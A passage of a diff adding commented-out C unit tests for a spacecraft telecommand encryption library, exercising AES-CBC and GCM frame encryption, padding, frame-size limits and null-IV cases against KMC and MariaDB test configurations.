+//     for(int i = 0; i < enc_frame_len; i++)
+//     {
+//         //printf("%02x -> %02x ", ptr_enc_frame[i], truth_data_b[i]);
+//         ASSERT_EQ(ptr_enc_frame[i], truth_data_b[i]);
+//     }
+//     //printf("\n");
+
+//     Crypto_Shutdown();
+//     free(raw_tc_sdls_ping_b);
+//     free(ptr_enc_frame);
+//     ASSERT_EQ(CRYPTO_LIB_SUCCESS, return_val);
+// }
+
+// /**
+//  * @brief Unit Test: Encryption CBC KMC 16 Bytes of padding
+//  **/
+// UTEST(TC_APPLY_SECURITY, ENC_CBC_KMC_16BP)
+// {
+//     // Setup & Initialize CryptoLib
+//     Crypto_Config_CryptoLib(KEY_TYPE_KMC, MC_TYPE_DISABLED, SA_TYPE_INMEMORY, CRYPTOGRAPHY_TYPE_KMCCRYPTO,
+//                             IV_INTERNAL, CRYPTO_TC_CREATE_FECF_TRUE, TC_PROCESS_SDLS_PDUS_TRUE, TC_HAS_PUS_HDR,
+//                             TC_IGNORE_SA_STATE_FALSE, TC_IGNORE_ANTI_REPLAY_TRUE, TC_UNIQUE_SA_PER_MAP_ID_FALSE,
+//                             TC_CHECK_FECF_TRUE, 0x3F, SA_INCREMENT_NONTRANSMITTED_IV_TRUE);
+//     Crypto_Config_Kmc_Crypto_Service("https", "itc-kmc.nasa.gov", 8443,
+//     "crypto-service","/certs/ammos-ca-bundle.crt",NULL, CRYPTO_TRUE, CLIENT_CERTIFICATE, "PEM",
+//     CLIENT_CERTIFICATE_KEY, NULL, NULL); Crypto_Config_Add_Gvcid_Managed_Parameter(0, 0x0003, 0, TC_HAS_FECF,
+//     TC_HAS_SEGMENT_HDRS, 1024, AOS_FHEC_NA, AOS_IZ_NA, 0); Crypto_Config_Add_Gvcid_Managed_Parameter(0, 0x0003, 1,
+//     TC_HAS_FECF, TC_HAS_SEGMENT_HDRS, 1024, AOS_FHEC_NA, AOS_IZ_NA, 0); Crypto_Config_Add_Gvcid_Managed_Parameter(0,
+//     0x0003, 2, TC_HAS_FECF, TC_HAS_SEGMENT_HDRS, 1024, AOS_FHEC_NA, AOS_IZ_NA, 0);
+//     Crypto_Config_Add_Gvcid_Managed_Parameter(0, 0x0003, 3, TC_HAS_FECF, TC_HAS_SEGMENT_HDRS, 1024, AOS_FHEC_NA,
+//     AOS_IZ_NA, 0); int32_t return_val = Crypto_Init(); ASSERT_EQ(CRYPTO_LIB_SUCCESS, return_val);
+
+//     char* raw_tc_sdls_ping_h = "20030017000080d2c70008197f0b003100000000b1fe3128";
+//     char* raw_tc_sdls_ping_b = NULL;
+//     int raw_tc_sdls_ping_len = 0;
+//     SaInterface sa_if = get_sa_interface_inmemory();
+
+//     hex_conversion(raw_tc_sdls_ping_h, &raw_tc_sdls_ping_b, &raw_tc_sdls_ping_len);
+
+//     uint8_t* ptr_enc_frame = NULL;
+//     uint16_t enc_frame_len = 0;
+
+//     SecurityAssociation_t* test_association = malloc(sizeof(SecurityAssociation_t) * sizeof(uint8_t));
+//     // Expose the SADB Security Association for test edits.
+//     sa_if->sa_get_from_spi(1, &test_association);
+//     test_association->sa_state = SA_NONE;
+//     sa_if->sa_get_from_spi(11, &test_association);
+//     printf("SPI: %d\n", test_association->spi);
+//     test_association->sa_state = SA_OPERATIONAL;
+//     test_association->ast = 0;
+//     test_association->arsn_len = 0;
+//     sa_if->sa_get_from_spi(11, &test_association);
+//     return_val =
+//         Crypto_TC_ApplySecurity((uint8_t* )raw_tc_sdls_ping_b, raw_tc_sdls_ping_len, &ptr_enc_frame, &enc_frame_len);
+
+//     char* truth_data_h =
+//     "2003003A0000000B00000000000000000000000000000000103970EAE4C05ACD1B0C348FDA174DF73EF0E2D603996C4B78B992CD60918729D3A47A";
+//     uint8_t* truth_data_b = NULL;
+//     int truth_data_l = 0;
+
+//     hex_conversion(truth_data_h, (char **)&truth_data_b, &truth_data_l);
+//     //printf("Encrypted Frame:\n");
+//     for(int i = 0; i < enc_frame_len; i++)
+//     {
+//         //printf("%02x -> %02x ", ptr_enc_frame[i], truth_data_b[i]);
+//         ASSERT_EQ(ptr_enc_frame[i], truth_data_b[i]);
+//     }
+//     printf("\n");
+
+//     Crypto_Shutdown();
+//     free(raw_tc_sdls_ping_b);
+//     free(ptr_enc_frame);
+//     ASSERT_EQ(CRYPTO_LIB_SUCCESS, return_val);
+// }
+
+// /**
+//  * @brief Unit Test: Nominal Encryption CBC KMC
+//  *                      Frame is max size for this test.  Any encrypted data of length greater than 1007 bytes,
+//  *                      will cause frame length exception.
+//  **/
+// UTEST(TC_APPLY_SECURITY, ENC_CBC_KMC_FRAME_MAX)
+// {
+//     // Setup & Initialize CryptoLib
+//     Crypto_Config_CryptoLib(KEY_TYPE_KMC, MC_TYPE_DISABLED, SA_TYPE_INMEMORY, CRYPTOGRAPHY_TYPE_KMCCRYPTO,
+//                             IV_INTERNAL, CRYPTO_TC_CREATE_FECF_TRUE, TC_PROCESS_SDLS_PDUS_TRUE, TC_HAS_PUS_HDR,
+//                             TC_IGNORE_SA_STATE_FALSE, TC_IGNORE_ANTI_REPLAY_TRUE, TC_UNIQUE_SA_PER_MAP_ID_FALSE,
+//                             TC_CHECK_FECF_TRUE, 0x3F, SA_INCREMENT_NONTRANSMITTED_IV_TRUE);
+//     Crypto_Config_Kmc_Crypto_Service("https", "itc-kmc.nasa.gov", 8443,
+//     "crypto-service","/certs/ammos-ca-bundle.crt",NULL, CRYPTO_TRUE, CLIENT_CERTIFICATE, "PEM",
+//     CLIENT_CERTIFICATE_KEY, NULL, NULL); Crypto_Config_Add_Gvcid_Managed_Parameter(0, 0x0003, 0, TC_HAS_FECF,
+//     TC_HAS_SEGMENT_HDRS, 1024, AOS_FHEC_NA, AOS_IZ_NA, 0); Crypto_Config_Add_Gvcid_Managed_Parameter(0, 0x0003, 1,
+//     TC_HAS_FECF, TC_HAS_SEGMENT_HDRS, 1024, AOS_FHEC_NA, AOS_IZ_NA, 0); Crypto_Config_Add_Gvcid_Managed_Parameter(0,
+//     0x0003, 2, TC_HAS_FECF, TC_HAS_SEGMENT_HDRS, 1024, AOS_FHEC_NA, AOS_IZ_NA, 0);
+//     Crypto_Config_Add_Gvcid_Managed_Parameter(0, 0x0003, 3, TC_HAS_FECF, TC_HAS_SEGMENT_HDRS, 1024, AOS_FHEC_NA,
+//     AOS_IZ_NA, 0); int32_t return_val = Crypto_Init(); ASSERT_EQ(CRYPTO_LIB_SUCCESS, return_val);
+
+//     char* raw_tc_sdls_ping_h =
+//     "200303E6000080d2c70008197f0b00310000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000b1fed255";
+//     char* raw_tc_sdls_ping_b = NULL;
+//     int raw_tc_sdls_ping_len = 0;
+//     SaInterface sa_if = get_sa_interface_inmemory();
+
+//     hex_conversion(raw_tc_sdls_ping_h, &raw_tc_sdls_ping_b, &raw_tc_sdls_ping_len);
+
+//     uint8_t* ptr_enc_frame = NULL;
+//     uint16_t enc_frame_len = 0;
+
+//     SecurityAssociation_t* test_association = malloc(sizeof(SecurityAssociation_t) * sizeof(uint8_t));
+//     // Expose the SADB Security Association for test edits.
+//     sa_if->sa_get_from_spi(1, &test_association);
+//     test_association->sa_state = SA_NONE;
+//     sa_if->sa_get_from_spi(11, &test_association);
+//     test_association->sa_state = SA_OPERATIONAL;
+//     test_association->ast = 0;
+//     test_association->arsn_len = 0;
+//     sa_if->sa_get_from_spi(11, &test_association);
+//     return_val =
+//         Crypto_TC_ApplySecurity((uint8_t* )raw_tc_sdls_ping_b, raw_tc_sdls_ping_len, &ptr_enc_frame, &enc_frame_len);
+
+//     Crypto_Shutdown();
+//     free(raw_tc_sdls_ping_b);
+//     free(ptr_enc_frame);
+//     ASSERT_EQ(CRYPTO_LIB_SUCCESS, return_val);
+// }
+
+// /**
+//  * @brief Unit Test: Encryption CBC KMC
+//  *                      Frame is 1 byte too large for this test.  Any encrypted data of length greater than 1007
+//  bytes,
+//  *                      will cause frame length exception.
+//  **/
+// UTEST(TC_APPLY_SECURITY, ENC_CBC_KMC_FRAME_TOO_BIG)
+// {
+//     // Setup & Initialize CryptoLib
+//     Crypto_Config_CryptoLib(KEY_TYPE_KMC, MC_TYPE_DISABLED, SA_TYPE_INMEMORY, CRYPTOGRAPHY_TYPE_KMCCRYPTO,
+//                             IV_INTERNAL, CRYPTO_TC_CREATE_FECF_TRUE, TC_PROCESS_SDLS_PDUS_TRUE, TC_HAS_PUS_HDR,
+//                             TC_IGNORE_SA_STATE_FALSE, TC_IGNORE_ANTI_REPLAY_TRUE, TC_UNIQUE_SA_PER_MAP_ID_FALSE,
+//                             TC_CHECK_FECF_TRUE, 0x3F, SA_INCREMENT_NONTRANSMITTED_IV_TRUE);
+//     Crypto_Config_Kmc_Crypto_Service("https", "itc-kmc.nasa.gov", 8443,
+//     "crypto-service","/certs/ammos-ca-bundle.crt",NULL, CRYPTO_TRUE, CLIENT_CERTIFICATE, "PEM",
+//     CLIENT_CERTIFICATE_KEY, NULL, NULL); Crypto_Config_Add_Gvcid_Managed_Parameter(0, 0x0003, 0, TC_HAS_FECF,
+//     TC_HAS_SEGMENT_HDRS, 1024, AOS_FHEC_NA, AOS_IZ_NA, 0); Crypto_Config_Add_Gvcid_Managed_Parameter(0, 0x0003, 1,
+//     TC_HAS_FECF, TC_HAS_SEGMENT_HDRS, 1024, AOS_FHEC_NA, AOS_IZ_NA, 0); Crypto_Config_Add_Gvcid_Managed_Parameter(0,
+//     0x0003, 2, TC_HAS_FECF, TC_HAS_SEGMENT_HDRS, 1024, AOS_FHEC_NA, AOS_IZ_NA, 0);
+//     Crypto_Config_Add_Gvcid_Managed_Parameter(0, 0x0003, 3, TC_HAS_FECF, TC_HAS_SEGMENT_HDRS, 1024, AOS_FHEC_NA,
+//     AOS_IZ_NA, 0); int32_t return_val = Crypto_Init(); ASSERT_EQ(CRYPTO_LIB_SUCCESS, return_val);
+
+//     char* raw_tc_sdls_ping_h =
+//     "200303F7000080d2c70008197f0b0031000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000b1fed255";
+//     char* raw_tc_sdls_ping_b = NULL;
+//     int raw_tc_sdls_ping_len = 0;
+//     SaInterface sa_if = get_sa_interface_inmemory();
+
+//     hex_conversion(raw_tc_sdls_ping_h, &raw_tc_sdls_ping_b, &raw_tc_sdls_ping_len);
+
+//     uint8_t* ptr_enc_frame = NULL;
+//     uint16_t enc_frame_len = 0;
+
+//     SecurityAssociation_t* test_association = malloc(sizeof(SecurityAssociation_t) * sizeof(uint8_t));
+//     // Expose the SADB Security Association for test edits.
+//     sa_if->sa_get_from_spi(1, &test_association);
+//     test_association->sa_state = SA_NONE;
+//     sa_if->sa_get_from_spi(11, &test_association);
+//     test_association->sa_state = SA_OPERATIONAL;
+//     test_association->ast = 0;
+//     test_association->arsn_len = 0;
+//     sa_if->sa_get_from_spi(11, &test_association);
+//     return_val =
+//         Crypto_TC_ApplySecurity((uint8_t* )raw_tc_sdls_ping_b, raw_tc_sdls_ping_len, &ptr_enc_frame, &enc_frame_len);
+
+//     Crypto_Shutdown();
+//     free(raw_tc_sdls_ping_b);
+//     free(ptr_enc_frame);
+//     ASSERT_EQ(CRYPTO_LIB_ERR_TC_FRAME_SIZE_EXCEEDS_SPEC_LIMIT, return_val);
+// }
+
+// /**
+//  * @brief Unit Test: Nominal Encryption CBC KMC, with no supplied IV
+//  **/
+// UTEST(TC_APPLY_SECURITY, ENC_CBC_KMC_NULL_IV)
+// {
+//     // Setup & Initialize CryptoLib
+//     Crypto_Config_CryptoLib(KEY_TYPE_KMC, MC_TYPE_DISABLED, SA_TYPE_INMEMORY, CRYPTOGRAPHY_TYPE_KMCCRYPTO,
+//                             IV_CRYPTO_MODULE, CRYPTO_TC_CREATE_FECF_TRUE, TC_PROCESS_SDLS_PDUS_TRUE, TC_HAS_PUS_HDR,
+//                             TC_IGNORE_SA_STATE_FALSE, TC_IGNORE_ANTI_REPLAY_TRUE, TC_UNIQUE_SA_PER_MAP_ID_FALSE,
+//                             TC_CHECK_FECF_TRUE, 0x3F, SA_INCREMENT_NONTRANSMITTED_IV_TRUE);
+//     Crypto_Config_Kmc_Crypto_Service("https", "itc-kmc.nasa.gov", 8443,
+//     "crypto-service","/certs/ammos-ca-bundle.crt",NULL, CRYPTO_TRUE, CLIENT_CERTIFICATE, "PEM",
+//     CLIENT_CERTIFICATE_KEY, NULL, NULL); Crypto_Config_Add_Gvcid_Managed_Parameter(0, 0x0003, 0, TC_HAS_FECF,
+//     TC_HAS_SEGMENT_HDRS, 1024, AOS_FHEC_NA, AOS_IZ_NA, 0); Crypto_Config_Add_Gvcid_Managed_Parameter(0, 0x0003, 1,
+//     TC_HAS_FECF, TC_HAS_SEGMENT_HDRS, 1024, AOS_FHEC_NA, AOS_IZ_NA, 0); Crypto_Config_Add_Gvcid_Managed_Parameter(0,
+//     0x0003, 2, TC_HAS_FECF, TC_HAS_SEGMENT_HDRS, 1024, AOS_FHEC_NA, AOS_IZ_NA, 0);
+//     Crypto_Config_Add_Gvcid_Managed_Parameter(0, 0x0003, 3, TC_HAS_FECF, TC_HAS_SEGMENT_HDRS, 1024, AOS_FHEC_NA,
+//     AOS_IZ_NA, 0); int32_t return_val = Crypto_Init(); ASSERT_EQ(CRYPTO_LIB_SUCCESS, return_val);
+
+//     char* raw_tc_sdls_ping_h = "20030015000080d2c70008197f0b00310000b1fe3128";
+//     char* raw_tc_sdls_ping_b = NULL;
+//     int raw_tc_sdls_ping_len = 0;
+//     SaInterface sa_if = get_sa_interface_inmemory();
+
+//     hex_conversion(raw_tc_sdls_ping_h, &raw_tc_sdls_ping_b, &raw_tc_sdls_ping_len);
+
+//     uint8_t* ptr_enc_frame = NULL;
+//     uint16_t enc_frame_len = 0;
+
+//     SecurityAssociation_t* test_association = malloc(sizeof(SecurityAssociation_t) * sizeof(uint8_t));
+//     // Expose the SADB Security Association for test edits.
+//     sa_if->sa_get_from_spi(1, &test_association);
+//     test_association->sa_state = SA_NONE;
+//     sa_if->sa_get_from_spi(11, &test_association);
+//     printf("SPI: %d\n", test_association->spi);
+//     test_association->sa_state = SA_OPERATIONAL;
+//     test_association->ast = 0;
+//     test_association->est = 1;
+//     test_association->stmacf_len = 0;
+//     test_association->ecs = CRYPTO_CIPHER_AES256_CBC;
+//     test_association->acs_len = 1;
+//     test_association->acs = 0;
+//     test_association->arsn_len = 0;
+//     sa_if->sa_get_from_spi(11, &test_association);
+//     return_val =
+//         Crypto_TC_ApplySecurity((uint8_t* )raw_tc_sdls_ping_b, raw_tc_sdls_ping_len, &ptr_enc_frame, &enc_frame_len);
+
+//     ASSERT_EQ(CRYPTO_LIB_SUCCESS, return_val);
+
+//     Crypto_Shutdown();
+//     free(raw_tc_sdls_ping_b);
+//     free(ptr_enc_frame);
+// }
+
+// /**
+//  * @brief Unit Test: Nominal Encryption CBC KMC, with no supplied IV
+//  **/
+// UTEST(TC_APPLY_SECURITY, ENC_GCM_KMC_NULL_IV)
+// {
+//     // Setup & Initialize CryptoLib
+//     Crypto_Config_CryptoLib(KEY_TYPE_KMC, MC_TYPE_DISABLED, SA_TYPE_INMEMORY, CRYPTOGRAPHY_TYPE_KMCCRYPTO,
+//                             IV_INTERNAL, CRYPTO_TC_CREATE_FECF_TRUE, TC_PROCESS_SDLS_PDUS_TRUE, TC_HAS_PUS_HDR,
+//                             TC_IGNORE_SA_STATE_FALSE, TC_IGNORE_ANTI_REPLAY_TRUE, TC_UNIQUE_SA_PER_MAP_ID_FALSE,
+//                             TC_CHECK_FECF_TRUE, 0x3F, SA_INCREMENT_NONTRANSMITTED_IV_TRUE);
+//     Crypto_Config_Kmc_Crypto_Service("https", "itc-kmc.nasa.gov", 8443,
+//     "crypto-service","/certs/ammos-ca-bundle.crt",NULL, CRYPTO_TRUE, CLIENT_CERTIFICATE, "PEM",
+//     CLIENT_CERTIFICATE_KEY, NULL, NULL); Crypto_Config_Add_Gvcid_Managed_Parameter(0, 0x0003, 0, TC_HAS_FECF,
+//     TC_HAS_SEGMENT_HDRS, 1024, AOS_FHEC_NA, AOS_IZ_NA, 0); int32_t return_val = Crypto_Init();
+//     ASSERT_EQ(CRYPTO_LIB_SUCCESS, return_val);
+//     // // 200300230000000B000000000000000000000000852DDEFF8FCD93567F271E192C07F126
+//     char* raw_tc_sdls_ping_h = "20030015000080d2c70008197f0b00310000b1fe3128";
+//     char* raw_tc_sdls_ping_b = NULL;
+//     int raw_tc_sdls_ping_len = 0;
+//     SaInterface sa_if = get_sa_interface_inmemory();
+
+//     hex_conversion(raw_tc_sdls_ping_h, &raw_tc_sdls_ping_b, &raw_tc_sdls_ping_len);
+
+//     uint8_t* ptr_enc_frame = NULL;
+//     uint16_t enc_frame_len = 0;
+
+//     SecurityAssociation_t* test_association = malloc(sizeof(SecurityAssociation_t) * sizeof(uint8_t));
+//     // Expose the SADB Security Association for test edits.
+//     sa_if->sa_get_from_spi(1, &test_association);
+//     test_association->sa_state = SA_NONE;
+//     sa_if->sa_get_from_spi(11, &test_association);
+//     printf("SPI: %d\n", test_association->spi);
+//     test_association->sa_state = SA_OPERATIONAL;
+//     test_association->ast = 1;
+//     test_association->est = 1;
+//     test_association->stmacf_len = 16;
+//     test_association->shplf_len = 0;
+//     test_association->ecs = CRYPTO_CIPHER_AES256_GCM;
+//     test_association->acs_len = 1;
+//     test_association->acs = 0;
+//     test_association->arsn_len = 0;
+//     test_association->iv_len = 12;
+//     test_association->shivf_len = 12;
+//     test_association->ecs = 0x01;
+//     return_val =
+//         Crypto_TC_ApplySecurity((uint8_t* )raw_tc_sdls_ping_b, raw_tc_sdls_ping_len, &ptr_enc_frame, &enc_frame_len);
+
+//     ASSERT_EQ(CRYPTO_LIB_SUCCESS, return_val);
+
+//     Crypto_Shutdown();
+//     free(raw_tc_sdls_ping_b);
+//     free(ptr_enc_frame);
+// }
+
+// //********************************* Encryption Tests MDB + KMC
+// *******************************************************************//
+// /**
+//  * @brief Unit Test: Nominal Encryption CBC MDB KMC
+//  **/
+// UTEST(TC_APPLY_SECURITY, HAPPY_PATH_ENC_CBC_MDB_KMC)
+// {
+//     // Setup & Initialize CryptoLib
+//     Crypto_Config_CryptoLib(KEY_TYPE_KMC, MC_TYPE_DISABLED, SA_TYPE_MARIADB, CRYPTOGRAPHY_TYPE_KMCCRYPTO,
+//                             IV_INTERNAL, CRYPTO_TC_CREATE_FECF_TRUE, TC_PROCESS_SDLS_PDUS_TRUE, TC_HAS_PUS_HDR,
+//                             TC_IGNORE_SA_STATE_FALSE, TC_IGNORE_ANTI_REPLAY_TRUE, TC_UNIQUE_SA_PER_MAP_ID_FALSE,
+//                             TC_CHECK_FECF_TRUE, 0x3F, SA_INCREMENT_NONTRANSMITTED_IV_TRUE);
+//     Crypto_Config_MariaDB("db-itc-kmc.nasa.gov","sadb", 3306,CRYPTO_TRUE,CRYPTO_TRUE, "/certs/ammos-ca-bundle.crt",
+//     NULL, CLIENT_CERTIFICATE, CLIENT_CERTIFICATE_KEY, NULL, "root", NULL); Crypto_Config_Kmc_Crypto_Service("https",
+//     "itc-kmc.nasa.gov", 8443, "crypto-service","/certs/ammos-ca-bundle.crt",NULL, CRYPTO_TRUE, CLIENT_CERTIFICATE,
+//     "PEM", CLIENT_CERTIFICATE_KEY, NULL, NULL);
+
+//     Crypto_Config_Add_Gvcid_Managed_Parameter(0, 0x0003, 6, TC_HAS_FECF, TC_HAS_SEGMENT_HDRS, 1024, AOS_FHEC_NA,
+//     AOS_IZ_NA, 0); int32_t return_val = Crypto_Init(); ASSERT_EQ(CRYPTO_LIB_SUCCESS, return_val);
+
+//     char* raw_tc_sdls_ping_h = "20031815000080d2c70008197f0b00310000b1fe3128";
+//     char* raw_tc_sdls_ping_b = NULL;
+//     int raw_tc_sdls_ping_len = 0;
+//     //SaInterface sa_if = get_sa_interface_inmemory();
+
+//     hex_conversion(raw_tc_sdls_ping_h, &raw_tc_sdls_ping_b, &raw_tc_sdls_ping_len);
+
+//     uint8_t* ptr_enc_frame = NULL;
+//     uint16_t enc_frame_len = 0;
+
+//     return_val =
+//         Crypto_TC_ApplySecurity((uint8_t* )raw_tc_sdls_ping_b, raw_tc_sdls_ping_len, &ptr_enc_frame, &enc_frame_len);
+
+//     ASSERT_EQ(CRYPTO_LIB_SUCCESS, return_val);
+
+//     Crypto_Shutdown();
+//     free(raw_tc_sdls_ping_b);
+//     free(ptr_enc_frame);
+// }
+
+// /**
+//  * @brief Unit Test: Encryption CBC MDB KMC 1 Byte of padding
+//  **/
+// UTEST(TC_APPLY_SECURITY, ENC_CBC_MDB_KMC_1BP)
+// {
+//     // Setup & Initialize CryptoLib
+//     Crypto_Config_CryptoLib(KEY_TYPE_KMC, MC_TYPE_DISABLED, SA_TYPE_MARIADB, CRYPTOGRAPHY_TYPE_KMCCRYPTO,
+//                             IV_INTERNAL, CRYPTO_TC_CREATE_FECF_TRUE, TC_PROCESS_SDLS_PDUS_TRUE, TC_HAS_PUS_HDR,
+//                             TC_IGNORE_SA_STATE_FALSE, TC_IGNORE_ANTI_REPLAY_TRUE, TC_UNIQUE_SA_PER_MAP_ID_FALSE,
+//                             TC_CHECK_FECF_TRUE, 0x3F, SA_INCREMENT_NONTRANSMITTED_IV_TRUE);
+//     Crypto_Config_MariaDB("db-itc-kmc.nasa.gov","sadb", 3306,CRYPTO_TRUE,CRYPTO_TRUE, "/certs/ammos-ca-bundle.crt",
+//     NULL, CLIENT_CERTIFICATE, CLIENT_CERTIFICATE_KEY, NULL, "root", NULL); Crypto_Config_Kmc_Crypto_Service("https",
+//     "itc-kmc.nasa.gov", 8443, "crypto-service","/certs/ammos-ca-bundle.crt",NULL, CRYPTO_TRUE, CLIENT_CERTIFICATE,
+//     "PEM", CLIENT_CERTIFICATE_KEY, NULL, NULL); Crypto_Config_Add_Gvcid_Managed_Parameter(0, 0x0003, 6, TC_HAS_FECF,
+//     TC_HAS_SEGMENT_HDRS, 1024, AOS_FHEC_NA, AOS_IZ_NA, 0); int32_t return_val = Crypto_Init();
+//     ASSERT_EQ(CRYPTO_LIB_SUCCESS, return_val);
+
+//     char* raw_tc_sdls_ping_h = "20031816000080d2c70008197f0b0031000000b1fe3128";
+//     char* raw_tc_sdls_ping_b = NULL;
+//     int raw_tc_sdls_ping_len = 0;
+
+//     hex_conversion(raw_tc_sdls_ping_h, &raw_tc_sdls_ping_b, &raw_tc_sdls_ping_len);
+
+//     uint8_t* ptr_enc_frame = NULL;
+//     uint16_t enc_frame_len = 0;
+
+//     return_val =
+//         Crypto_TC_ApplySecurity((uint8_t* )raw_tc_sdls_ping_b, raw_tc_sdls_ping_len, &ptr_enc_frame, &enc_frame_len);
+
+//     ASSERT_EQ(CRYPTO_LIB_SUCCESS, return_val);
+
+//     char* truth_data_h = "2003182A0000001200000000000000000000000000000002011D90CE80C259660B229B6C1783C80E898D52";
+//     uint8_t* truth_data_b = NULL;
+//     int truth_data_l = 0;
+
+//     hex_conversion(truth_data_h, (char **)&truth_data_b, &truth_data_l);
+//     printf("Encrypted Frame:\n");
+//     for(int i = 0; i < enc_frame_len; i++)
+//     {
+//         printf("%02x -> %02x ", ptr_enc_frame[i], truth_data_b[i]);
+//         ASSERT_EQ(ptr_enc_frame[i], truth_data_b[i]);
+//     }
+//     printf("\n");
+
+//     Crypto_Shutdown();
+//     //free(raw_tc_sdls_ping_b);
+//     //free(ptr_enc_frame);
+// }
+
+// /**
+//  * @brief Unit Test: Encryption CBC MDB KMC 16 Bytes of padding
+//  **/
+// UTEST(TC_APPLY_SECURITY, ENC_CBC_MDB_KMC_16BP)
+// {
+//     // Setup & Initialize CryptoLib
+//     Crypto_Config_CryptoLib(KEY_TYPE_KMC, MC_TYPE_DISABLED, SA_TYPE_MARIADB, CRYPTOGRAPHY_TYPE_KMCCRYPTO,
+//                             IV_INTERNAL, CRYPTO_TC_CREATE_FECF_TRUE, TC_PROCESS_SDLS_PDUS_TRUE, TC_HAS_PUS_HDR,
+//                             TC_IGNORE_SA_STATE_FALSE, TC_IGNORE_ANTI_REPLAY_TRUE, TC_UNIQUE_SA_PER_MAP_ID_FALSE,
+//                             TC_CHECK_FECF_TRUE, 0x3F, SA_INCREMENT_NONTRANSMITTED_IV_TRUE);
+//     Crypto_Config_MariaDB("db-itc-kmc.nasa.gov","sadb", 3306,CRYPTO_TRUE,CRYPTO_TRUE, "/certs/ammos-ca-bundle.crt",
+//     NULL, CLIENT_CERTIFICATE, CLIENT_CERTIFICATE_KEY, NULL, "root", NULL); Crypto_Config_Kmc_Crypto_Service("https",
+//     "itc-kmc.nasa.gov", 8443, "crypto-service","/certs/ammos-ca-bundle.crt",NULL, CRYPTO_TRUE, CLIENT_CERTIFICATE,
+//     "PEM", CLIENT_CERTIFICATE_KEY, NULL, NULL); Crypto_Config_Add_Gvcid_Managed_Parameter(0, 0x0003, 6, TC_HAS_FECF,
+//     TC_HAS_SEGMENT_HDRS, 1024, AOS_FHEC_NA, AOS_IZ_NA, 0); int32_t return_val = Crypto_Init();
+//     ASSERT_EQ(CRYPTO_LIB_SUCCESS, return_val);
+
+//     char* raw_tc_sdls_ping_h = "20031817000080d2c70008197f0b003100000000b1fe3128";
+//     char* raw_tc_sdls_ping_b = NULL;
+//     int raw_tc_sdls_ping_len = 0;
+
+//     hex_conversion(raw_tc_sdls_ping_h, &raw_tc_sdls_ping_b, &raw_tc_sdls_ping_len);
+
+//     uint8_t* ptr_enc_frame = NULL;
+//     uint16_t enc_frame_len = 0;
+
+//     return_val =
+//         Crypto_TC_ApplySecurity((uint8_t* )raw_tc_sdls_ping_b, raw_tc_sdls_ping_len, &ptr_enc_frame, &enc_frame_len);
+
+//     char* truth_data_h =
+//     "2003183A000000120000000000000000000000000000000310CA8B21BCB5AFB1A306CDC96C80C9208D00EB961E3F61D355E30F01CFDCCC7D026D56";
+//     uint8_t* truth_data_b = NULL;
+//     int truth_data_l = 0;
+
+//     hex_conversion(truth_data_h, (char **)&truth_data_b, &truth_data_l);
+//     //printf("Encrypted Frame:\n");
+//     for(int i = 0; i < enc_frame_len; i++)
+//     {
+//         //printf("%02x -> %02x ", ptr_enc_frame[i], truth_data_b[i]);
+//         ASSERT_EQ(ptr_enc_frame[i], truth_data_b[i]);
+//     }
+//     printf("\n");
+
+//     Crypto_Shutdown();
+//     free(raw_tc_sdls_ping_b);
+//     free(ptr_enc_frame);
+//     ASSERT_EQ(CRYPTO_LIB_SUCCESS, return_val);
+// }
+
+// /**
+//  * @brief Unit Test: Nominal Encryption CBC MDB KMC
+//  *                      Frame is max size for this test.  Any encrypted data of length greater than 1007 bytes,
+//  *                      will cause frame length exception.
+//  **/
+// UTEST(TC_APPLY_SECURITY, ENC_CBC_MDB_KMC_FRAME_MAX)
+// {
+//     // Setup & Initialize CryptoLib
+//     Crypto_Config_CryptoLib(KEY_TYPE_KMC, MC_TYPE_DISABLED, SA_TYPE_MARIADB, CRYPTOGRAPHY_TYPE_KMCCRYPTO,
+//                             IV_INTERNAL, CRYPTO_TC_CREATE_FECF_TRUE, TC_PROCESS_SDLS_PDUS_TRUE, TC_HAS_PUS_HDR,
